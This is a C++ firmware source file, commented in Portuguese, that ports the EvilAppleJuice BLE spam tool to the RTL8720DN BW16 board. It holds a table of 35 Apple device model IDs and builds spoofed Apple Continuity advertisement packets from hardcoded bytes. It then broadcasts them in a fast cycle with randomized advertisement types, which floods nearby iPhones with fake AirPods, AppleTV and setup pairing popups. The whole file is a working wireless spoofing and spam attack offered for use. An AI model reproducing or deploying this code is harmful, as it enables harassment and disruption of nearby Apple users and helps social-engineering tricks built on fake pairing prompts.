// =========================================================
// BLE Spam – Port of EvilAppleJuice-ESP32 para RTL8720DN BW16
// Original: github.com/EvilAppleJuice-ESP32
//
// Adaptações para Ameba SDK (BLEDevice.h v3.1.9):
//  - Objeto global é BLE (extern BLEDevice BLE), não BLEDevice::xxx
//  - BLEAdvert::setAdvData(uint8_t*, uint8_t) aceita buffer raw
//  - Sem setDeviceAddress() público → MAC fixo do chip (SDK limitação)
//  - ADV type randômico: ADV_IND / ADV_SCAN_IND / ADV_NONCONN_IND
// =========================================================

// STL primeiro para evitar conflito com macros do Ameba
#undef max
#include <vector>

#include "ble_spam.h"
#include "debug.h"

// =========================================================
// Tabela de dispositivos Apple (port direto de devices.hpp)
// =========================================================
const AppleDevice ALL_APPLE_DEVICES[] = {
  // ---- Audio (APPLE_AUDIO): payload 31 bytes, modelId no byte 7 ----
  {"Airpods",                0x02, APPLE_AUDIO},
  {"Power Beats",            0x03, APPLE_AUDIO},
  {"Beats X",                0x05, APPLE_AUDIO},
  {"Beats Solo 3",           0x06, APPLE_AUDIO},
  {"Beats Studio 3",         0x09, APPLE_AUDIO},
  {"Airpods Max",            0x0a, APPLE_AUDIO},
  {"Power Beats Pro",        0x0b, APPLE_AUDIO},
  {"Beats Solo Pro",         0x0c, APPLE_AUDIO},
  {"Airpods Pro",            0x0e, APPLE_AUDIO},
  {"Airpods Gen 2",          0x0f, APPLE_AUDIO},
  {"Beats Flex",             0x10, APPLE_AUDIO},
  {"Beats Studio Buds",      0x11, APPLE_AUDIO},
  {"Beats Fit Pro",          0x12, APPLE_AUDIO},
  {"Airpods Gen 3",          0x13, APPLE_AUDIO},
  {"Airpods Pro Gen 2",      0x14, APPLE_AUDIO},
  {"Beats Studio Buds+",     0x16, APPLE_AUDIO},
  {"Beats Studio Pro",       0x17, APPLE_AUDIO},
  {"Airpods Pro G2 USB-C",   0x24, APPLE_AUDIO},
  {"Beats Solo 4",           0x25, APPLE_AUDIO},
  {"Beats Solo Buds",        0x26, APPLE_AUDIO},
  {"Software Update",        0x2e, APPLE_AUDIO},
  {"Powerbeats Fit",         0x2f, APPLE_AUDIO},
  // ---- Setup (APPLE_SETUP): payload 23 bytes, modelId no byte 13 ----
  {"AppleTV Setup",          0x01, APPLE_SETUP},
  {"Transfer Number",        0x02, APPLE_SETUP},
  {"AppleTV Pair",           0x06, APPLE_SETUP},
  {"Setup New Phone",        0x09, APPLE_SETUP},
  {"Homepod Setup",          0x0b, APPLE_SETUP},
  {"AppleTV Homekit",        0x0d, APPLE_SETUP},
  {"AppleTV Keyboard",       0x13, APPLE_SETUP},
  {"TV Color Balance",       0x1e, APPLE_SETUP},
  {"AppleTV New User",       0x20, APPLE_SETUP},
  {"Vision Pro",             0x24, APPLE_SETUP},
  {"AppleTV Conn Net",       0x27, APPLE_SETUP},
  {"AppleTV AppleID",        0x2b, APPLE_SETUP},
  {"AppleTV Audio Sync",     0xc0, APPLE_SETUP},
};

// =========================================================
// generateApplePacket – port de devices.cpp::generatePacket
//
// Retorna um buffer ADV record completo (já com length + type + OUI):
//  APPLE_AUDIO → 31 bytes: [0x1e][0xff][0x4c][0x00][0x07][0x19][0x07][modelId][body×11]
//  APPLE_SETUP → 23 bytes: [0x16][0xff][0x4c][0x00][prefix×9][modelId][suffix×9]
// =========================================================
static uint8_t generateApplePacket(const AppleDevice& dev, uint8_t* buf) {
  memset(buf, 0, 31);

  if (dev.type == APPLE_AUDIO) {
    // Apple Proximity Pairing (Continuity Type 0x07):
    // Byte 0: 0x1E (AD length: 30 bytes follow)
    // Byte 1: 0xFF (Manufacturer Specific Data)
    // Byte 2..3: 0x4C, 0x00 (Apple Inc. Company ID - Little Endian)
    // Byte 4: 0x07 (Continuity Subtype: Proximity Pairing)
    // Byte 5: 0x19 (Continuity payload length: 25 bytes follow)
    // Byte 6: 0x07 (Prefix)
    // Byte 7: modelId (Device Model ID)
    // Byte 8..18: Status / Battery / Buds info (11 bytes)
    // Byte 19..30: 12 padding bytes (zeros for unbonded proximity advertisement)
    // Total AD structure length = 1 (length byte) + 30 bytes = 31 bytes.
    const uint8_t header[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07};
    const uint8_t body[]   = {0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
    memcpy(buf, header, 7);
    buf[7] = dev.modelId;
    memcpy(buf + 8, body, 11);
    return 31; // Total length: 1 AD len + 30 data bytes (25 continuity bytes)
  } else {
    // APPLE_SETUP (Continuity Type 0x04):
    // Byte 0: 0x16 (AD length: 22 bytes follow)
    // Byte 1: 0xFF (Manufacturer Specific Data)
    // Byte 2..3: 0x4C, 0x00 (Apple Inc. Company ID - Little Endian)
    // Byte 4..12: Setup prefix (9 bytes)
    // Byte 13: modelId
    // Byte 14..22: Setup suffix (9 bytes)
    // Total AD structure length = 1 (length byte) + 22 bytes = 23 bytes.
    const uint8_t prefix[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1};
    const uint8_t suffix[] = {0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    memcpy(buf, prefix, 13);
    buf[13] = dev.modelId;
    memcpy(buf + 14, suffix, 9);
    return 23; // Total length: 1 AD len + 22 data bytes
  }
}

// =========================================================
// Runtime state
// =========================================================
bool     isBleSpamming = false;
uint32_t ble_pkt_sent  = 0;
uint8_t  ble_spam_idx  = 0;

static bool ble_initialized = false;

// ADV type constants disponíveis no GAP Ameba
// GAP_ADTYPE_ADV_IND        = 0x00
// GAP_ADTYPE_ADV_SCAN_IND   = 0x02
// GAP_ADTYPE_ADV_NONCONN_IND= 0x03
static const uint8_t ADV_TYPES[] = {
  GAP_ADTYPE_ADV_IND,
  GAP_ADTYPE_ADV_SCAN_IND,
  GAP_ADTYPE_ADV_NONCONN_IND
};

// =========================================================
// ble_spam_next – avança para o próximo dispositivo e transmite
// =========================================================
void ble_spam_next() {
  if (!ble_initialized) return;

  // Avança no ciclo de 35 dispositivos
  ble_spam_idx = (ble_spam_idx + 1) % (uint8_t)NUM_APPLE_DEVICES;
  const AppleDevice& dev = ALL_APPLE_DEVICES[ble_spam_idx];

  // Constrói o payload Apple (AD record raw)
  uint8_t packet[31];
  uint8_t pktLen = generateApplePacket(dev, packet);

  DEBUG_SER_PRINT("[BLE] TX: ");
  DEBUG_SER_PRINT(dev.name);
  DEBUG_SER_PRINT(" id=0x");
  DEBUG_SER_PRINT(dev.modelId, HEX);
  DEBUG_SER_PRINT(" len=");
  DEBUG_SER_PRINT((int)pktLen);
  DEBUG_SER_PRINT("\n");

  // Seleciona ADV type aleatório (igual ao EvilAppleJuice original)
  uint8_t advType = ADV_TYPES[random(3)];

  BLEAdvert* advert = BLE.configAdvert();
  advert->stopAdv();
  advert->setAdvType(advType);

  // 20ms intervalo = recomendação Apple QA1931 para máxima visibilidade
  // 0x0020 = 32 * 0.625ms = 20ms
  advert->setMinInterval(0x0020);
  advert->setMaxInterval(0x0020);

  // Injeta o payload diretamente como ADV data raw
  advert->setAdvData(packet, pktLen);
  advert->updateAdvertParams();
  advert->startAdv();

  ble_pkt_sent++;
}

// =========================================================
// start_ble_spam
// =========================================================
void start_ble_spam() {
  if (ble_initialized) return;

  DEBUG_SER_PRINT("[BLE] Iniciando EvilAppleJuice (35 dispositivos Apple)...\n");

  BLE.init();
  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
  BLE.beginPeripheral();

  ble_initialized = true;
  isBleSpamming   = true;
  ble_pkt_sent    = 0;
  ble_spam_idx    = (uint8_t)(NUM_APPLE_DEVICES - 1); // próximo next() começa do 0

  DEBUG_SER_PRINT("[BLE] Pronto. Iniciando broadcast...\n");
  ble_spam_next(); // primeiro pacote imediato
}

// =========================================================
// stop_ble_spam
// =========================================================
void stop_ble_spam() {
  isBleSpamming = false;
  if (ble_initialized) {
    BLE.configAdvert()->stopAdv();
    BLE.end();
    ble_initialized = false;
    DEBUG_SER_PRINT("[BLE] BLE spam parado.\n");
  }
}